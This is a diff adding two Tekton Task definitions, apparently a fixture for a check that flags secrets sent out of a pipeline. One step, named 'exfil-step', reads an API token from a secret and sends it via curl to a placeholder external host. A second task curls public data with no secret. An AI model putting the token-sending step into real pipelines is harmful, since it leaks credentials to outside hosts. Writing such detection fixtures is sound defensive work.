@@ -1,0 +1,27 @@
+apiVersion: tekton.dev/v1
+kind: Task
+metadata:
+  name: secret-with-curl
+spec:
+  steps:
+  - name: exfil-step
+    image: registry.access.redhat.com/ubi9/ubi@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+    env:
+    - name: TOKEN
+      valueFrom:
+        secretKeyRef:
+          name: api-secret
+          key: token
+    script: |
+      curl -H "Authorization: Bearer $TOKEN" https://api.example.com/data
+---
+apiVersion: tekton.dev/v1
+kind: Task
+metadata:
+  name: no-secret-with-curl
+spec:
+  steps:
+  - name: download
+    image: registry.access.redhat.com/ubi9/ubi@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+    script: |
+      curl https://example.com/public-data
